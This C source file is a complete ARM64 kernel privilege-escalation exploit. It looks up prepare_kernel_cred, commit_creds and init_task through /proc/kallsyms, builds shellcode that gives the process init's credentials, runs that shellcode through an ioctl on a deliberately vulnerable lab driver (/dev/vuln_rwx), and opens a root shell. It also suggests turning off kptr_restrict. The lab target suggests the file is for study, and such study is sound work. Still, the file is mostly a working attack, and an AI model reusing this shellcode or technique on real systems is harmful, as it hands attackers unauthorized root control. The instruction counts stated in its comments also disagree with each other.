/*
 * api_privesc.c - API-based privilege escalation (for comparison)
 *
 * Uses prepare_kernel_cred(NULL) + commit_creds() via /proc/kallsyms.
 * 16 instructions, 64 bytes.
 *
 * This is the approach that uses kallsyms  . Run this
 * alongside raw_privesc to compare instruction count, dependencies,
 * and tradeoffs.
 */

#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

struct vuln_rwx_request {
  void *code;
  size_t len;
};
#define VULN_RWX_EXEC _IOW('R', 1, struct vuln_rwx_request)

static unsigned long lookup_symbol_file(const char *path, const char *name) {
  FILE *f;
  char line[256];
  unsigned long addr;
  char type, sym[128];

  f = fopen(path, "r");
  if (!f)
    return 0;

  while (fgets(line, sizeof(line), f)) {
    if (sscanf(line, "%lx %c %127s", &addr, &type, sym) == 3) {
      if (strcmp(sym, name) == 0 && addr != 0) {
        fclose(f);
        return addr;
      }
    }
  }

  fclose(f);
  return 0;
}

static unsigned long lookup_symbol(const char *name) {
  unsigned long addr;

  /* Try /proc/kallsyms first (works if kptr_restrict=0 and we have perms) */
  addr = lookup_symbol_file("/proc/kallsyms", name);
  if (addr)
    return addr;

  /* Fallback: setup_capstone.sh or test harness may cache symbols here */
  addr = lookup_symbol_file("/tmp/kallsyms_cache", name);
  if (addr)
    return addr;

  fprintf(stderr, "Symbol '%s' not found\n", name);
  return 0;
}

static uint32_t encode_movz(int rd, uint16_t imm16, int shift) {
  return 0xD2800000 | ((shift / 16) << 21) | ((uint32_t)imm16 << 5) | rd;
}

static uint32_t encode_movk(int rd, uint16_t imm16, int shift) {
  return 0xF2800000 | ((shift / 16) << 21) | ((uint32_t)imm16 << 5) | rd;
}

static uint32_t encode_blr(int rn) { return 0xD63F0000 | (rn << 5); }

static uint32_t encode_ret(void) { return 0xD65F03C0; }

static int emit_load_imm64(uint32_t *buf, int idx, int rd, unsigned long addr) {
  buf[idx++] = encode_movz(rd, (addr >> 0) & 0xFFFF, 0);
  buf[idx++] = encode_movk(rd, (addr >> 16) & 0xFFFF, 16);
  buf[idx++] = encode_movk(rd, (addr >> 32) & 0xFFFF, 32);
  buf[idx++] = encode_movk(rd, (addr >> 48) & 0xFFFF, 48);
  return idx;
}

int main(void) {
  unsigned long pkc_addr, cc_addr, init_task_addr;
  uint32_t shellcode[64];
  int fd, idx = 0;
  struct vuln_rwx_request req;

  printf("[*] API-based exploit (prepare_kernel_cred + commit_creds)\n");

  pkc_addr = lookup_symbol("prepare_kernel_cred");
  cc_addr = lookup_symbol("commit_creds");
  init_task_addr = lookup_symbol("init_task");

  if (!pkc_addr || !cc_addr || !init_task_addr) {
    fprintf(stderr, "[-] Failed to resolve symbols.\n");
    fprintf(stderr, "    Try: echo 0 > /proc/sys/kernel/kptr_restrict\n");
    return 1;
  }

  printf("[+] prepare_kernel_cred = 0x%lx\n", pkc_addr);
  printf("[+] commit_creds        = 0x%lx\n", cc_addr);
  printf("[+] init_task           = 0x%lx\n", init_task_addr);

  /*
   * Build shellcode (19 instructions, 76 bytes):
   *   - save callee-saved regs
   *   - load prepare_kernel_cred addr into x19
   *   - load commit_creds addr into x20
   *   - load &init_task into x0 (argument to prepare_kernel_cred)
   *   - call prepare_kernel_cred(&init_task) -> x0 = root creds
   *   - call commit_creds(x0)
   *   - restore regs + return
   *
   * NOTE: prepare_kernel_cred(NULL) was deprecated in Linux 6.1+.
   * Passing &init_task copies init's credentials (uid=0, root).
   */
  shellcode[idx++] = 0xA9BF7BFD; /* stp x29, x30, [sp, #-16]! */
  shellcode[idx++] = 0xA9BF53F3; /* stp x19, x20, [sp, #-16]! */
  idx = emit_load_imm64(shellcode, idx, 19, pkc_addr);
  idx = emit_load_imm64(shellcode, idx, 20, cc_addr);
  idx = emit_load_imm64(shellcode, idx, 0, init_task_addr);
  shellcode[idx++] = encode_blr(19); /* prepare_kernel_cred(&init_task) */
  shellcode[idx++] = encode_blr(20); /* commit_creds(x0)               */
  shellcode[idx++] = 0xA8C153F3;     /* ldp x19, x20, [sp], #16 */
  shellcode[idx++] = 0xA8C17BFD;     /* ldp x29, x30, [sp], #16 */
  shellcode[idx++] = encode_ret();

  printf("[*] Shellcode: %d instructions (%zu bytes)\n", idx,
         idx * sizeof(uint32_t));

  fd = open("/dev/vuln_rwx", O_RDWR);
  if (fd < 0) {
    perror("open /dev/vuln_rwx");
    return 1;
  }

  req.code = shellcode;
  req.len = idx * sizeof(uint32_t);

  printf("[*] Sending %zu bytes to /dev/vuln_rwx...\n", req.len);

  if (ioctl(fd, VULN_RWX_EXEC, &req) < 0) {
    perror("ioctl VULN_RWX_EXEC");
    close(fd);
    return 1;
  }
  close(fd);

  if (getuid() == 0) {
    printf("[+] SUCCESS: uid=0 (root)\n");
    printf("[*] Spawning root shell...\n");
    fflush(stdout);
    execl("/bin/sh", "sh", NULL);
  } else {
    printf("[-] FAILED: uid=%d (not root)\n", getuid());
    return 1;
  }

  return 0;
}
